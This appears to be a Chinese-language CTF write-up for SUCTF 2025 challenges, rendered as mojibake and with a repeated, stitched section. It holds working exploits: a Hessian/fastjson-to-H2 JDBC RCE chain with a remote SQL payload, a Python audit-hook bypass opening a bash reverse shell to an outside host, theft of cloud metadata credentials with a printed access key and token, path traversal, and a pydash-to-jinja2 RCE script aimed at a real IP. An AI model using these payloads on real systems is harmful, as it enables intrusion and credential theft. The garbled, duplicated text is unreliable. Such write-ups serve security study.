¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = 